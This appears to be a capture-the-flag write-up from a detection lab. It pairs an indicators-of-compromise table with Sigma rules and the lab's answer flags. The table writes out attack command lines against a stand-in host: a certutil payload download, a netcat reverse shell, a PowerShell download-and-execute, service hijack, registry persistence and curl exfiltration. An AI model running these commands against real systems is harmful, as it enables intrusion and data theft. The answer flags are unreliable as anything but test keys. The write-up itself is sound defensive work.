@@ -1,0 +1,226 @@
+
+| Attack Technique | Indicators of Compromise |
+| HTA payload | Parent Image: chrome.exe
+Image: mshta.exe
+Command Line: C:\Windows\SysWOW64\mshta.exe C:\Users\victim\Downloads\update.hta |
+| Certutil Download | Image: certutil.exe
+Command Line: certutil -urlcache -split -f http://huntmeplz.com/ransom.exe ransom.exe |
+| Netcat Reverse Shell | Image: nc.exe
+Command Line: C:\Users\victim\AppData\Local\Temp\nc.exe huntmeplz.com 4444 -e cmd.exe
+MD5 Hash: 523613A7B9DFA398CBD5EBD2DD0F4F38 |
+| PowerUp Enumeration | Image: powershell.exe
+Command Line: powershell "iex(new-object net.webclient).downloadstring('http://huntmeplz.com/PowerUp.ps1'); Invoke-AllChecks;" |
+| Service Binary Modification | Image: sc.exe
+Command Line: sc.exe config SNMPTRAP binPath= "C:\Users\victim\AppData\Local\Temp\rev.exe huntmeplz.com 4443 -e cmd.exe" |
+| RunOnce Persistence | Image: reg.exe
+Command  Line: reg add  "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce"  /v MicrosoftUpdate /t REG_SZ /d "C:\Windows\System32\cmdd.exe" |
+| 7-zip Collection | Image: 7z.exe
+Command Line: 7z a exfil.zip * -p |
+| cURL Exfiltration | Image: curl.exe
+Command Line: curl -d @exfil.zip http://huntmeplz.com:8080/ |
+| Ransomware File Encryption | Image: ransom.exe
+Target Filename: *.huntme |
+
+
+
+1$ suspicious_mshta_execution.yml
+
+title: HTA
+id: 852f6a2f-9186-42b3-9ac6-8b1a779773f5
+status: testing 
+description: Detecting HTA payload
+author: CRASHVENDETTA
+date: 01/14/2023
+modified: 01/14/2023
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  selection:
+    EventID: 1
+    ParentImage|endswith: '\chrome.exe'
+    Image|endswith: '\mshta.exe'
+  condition: selection #Action to be taken. Can use condition operators such as OR, AND, NOT, 
+
+
+
+
+Successfully detected malicious mshta execution. Here is your flag - THM{ph1sh1ng_msht4_101}
+
+
+2.$ certutil_file_ingress.yml
+
+title: certutil
+id: 852f6a2f-9186-42b3-9ac6-8b1a779773f5
+status:  testing 
+description: detecting certuil file
+author: crashvendetta
+date: 01/14/2023
+modified: 01/14/2023
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  selection:
+    EventID: 1
+    ParentImage|endswith: '\cmd.exe'
+    Image|endswith: '\certutil.exe'
+    CommandLine|contains:
+        -  '-urlcache '
+        -   '-split' 
+        -   '-f' 
+  condition: selection #Action to be taken. Can use condition 
+  
+  Successfully detected suspicious certutil download. Here is your flag - THM{n0t_just_4_c3rts}
+  
+  
+  3.$ netcat_reverse_shell.yml
+  
+  
+  title: certutil
+id: 852f6a2f-9186-42b3-9ac6-8b1a779773f5
+status:  testing 
+description: detecting certuil file
+author: crashvendetta
+date: 01/14/2023
+modified: 01/14/2023
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\nc.exe'
+    CommandLine|contains|all:
+    - ' -e '
+  selection2:
+    Hashes|contains: '523613A7B9DFA398CBD5EBD2DD0F4F38' 
+  condition: selection or selection2 #Action to be taken. Can use condition 
+  
+  
+  Successfully detected netcat reverse shell execution. Here is your flag - THM{cl4ss1c_n3tc4t_r3vs}
+  
+ 
+$ suspicious_mshta_execution.yml  
+
+
+
+  title: certutil
+id: 852f6a2f-9186-42b3-9ac6-8b1a779773f5
+status:  testing 
+description: detecting certuil file
+author: crashvendetta
+date: 01/14/2023
+modified: 01/14/2023
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains:
+    - 'Invoke-AllChecks'
+    - ' PowerUp '
+  condition: selection #Action to be taken. Can use condition 
+  
+  
+  Successfully detected enumeration using PowerUp. Here is your flag - THM{p0wp0wp0w3rup_3num}
+  
+  
+5/  $ service_binary_privesc.yml
+  
+  title: service
+id: fcf32bb4-f91c-4ed4-9dfa-9bd47928edf8
+status: testing 
+description: detection service binn
+author: crashvendetta
+date: 14/01/2023
+modified: 14/01/2023
+logsource:
+  product: windows
+  service: process_creation
+detection:
+ selection:
+    EventID: 1
+    Image|endswith: '\sc.exe'
+    CommandLine|contains|all:
+    - ' config '
+    - ' binPath= '
+    - ' -e '
+ condition: selection
+ 
+ 
+ 
+ $ runonce_persistence.yml
+ 
+ title: persistence
+id: fcf32bb4-f91c-4ed4-9dfa-9bd47928edf8
+status: testing 
+description: detecting persistence
+author: Crashvendetta
+date: 14/01/2022
+modified: 14/01/2022
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\reg.exe'
+    CommandLine|contains:
+    - ' add '
+    - ' RunOnce '
+  condition: selection #Action to be taken. Can use condition operators such as OR, AND, NOT, 
+
+
+Successfully detected persistence on RunOnce registry key. Here is your flag - THM{h1d3_m3_1n_run0nc3}
+
+
+6$ curl_exfiltration.yml
+
+title: exfil
+id: 33542572-b50f-4309-a625-14c23e76e6a8
+status: testing 
+description: intensions
+author: crashvendetta
+date: 14/01/2023
+modified: 14/01/2023
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\curl.exe'
+    CommandLine|contains|all:
+    - ' -d '
+    
+  condition: selection
+
+
+
+Successfully detected exfiltration via curl.exe. Here is your flag - THM{cUrling_0n_w1nd0ws}
+
+
+
+$ ransomware_file_encryption.yml
+
+
+title: Rasomware
+id: 33542572-b50f-4309-a625-14c23e76e6a8
+status: testing 
+description: detection
+author: Crashvendetta
+date: 14/01/2023
+modified: 14/01/2023
+logsource:
+  product: windows
+  service: process_creation
+detection:
+  selection:
+    EventID: 11
+   
+    TargetFilename: '*.huntme'
+  condition: selection #Action to be taken. Can use condition 
+Successfully detected ransomware file encryption with huntme extension. Here is your flag - THM{huntm3_pl34s3}
